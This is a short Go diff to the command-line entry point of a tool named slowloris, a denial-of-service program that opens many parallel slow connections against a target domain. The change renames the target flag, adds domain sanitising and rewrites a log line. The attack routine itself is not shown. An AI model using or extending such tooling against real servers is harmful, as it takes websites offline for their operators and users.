@@ -6,7 +6,7 @@ import (
 )
 
 func main() {
-	var url *string = flag.String("url", "", "URL to perform attack")
+	var domain *string = flag.String("domain", "", "Domain to perform attack")
 	var count *int64 = flag.Int64("count", int64(10), "Number of parallel workers")
 
 	flag.Parse()
@@ -15,15 +15,20 @@ func main() {
 		return
 	}
 
-	if *url == "" {
+	if *domain == "" {
 		Help()
 		return
 	}
 
+	sanitized, err := SanitizeDomain(*domain)
+	if err != nil {
+		fmt.Println(err)
+	}
+
 	fmt.Println("slowloris...")
-	fmt.Printf("url: %s, count: %d\n", *url, *count)
+	fmt.Printf("creating zoo of %d loris for %s\n", *count, sanitized)
 	if err := Zoo(Config{
-		URL:   *url,
+		URL:   sanitized,
 		Count: *count,
 	}); err != nil {
 		fmt.Println(err)
